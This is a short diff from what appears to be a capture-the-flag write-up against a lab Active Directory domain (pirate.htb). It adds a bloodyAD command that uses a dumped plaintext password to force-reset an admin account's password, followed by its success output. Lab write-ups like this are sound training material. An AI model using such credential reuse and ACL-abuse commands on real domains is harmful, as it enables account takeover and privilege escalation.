@@ -617,6 +617,13 @@ I can also dump LSA, i have now got `a.white` password
 This user i have now got has ForceChangePassword on the `adm` account
 
 ```python
+bloodyAD --host dc01.pirate.htb -d pirate.htb -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' set password 'a.white_adm' 'Password123!'
+[+] Password changed successfully!
+```
+
+The accounts password has now been changed
+
+```python
 
 ```
 
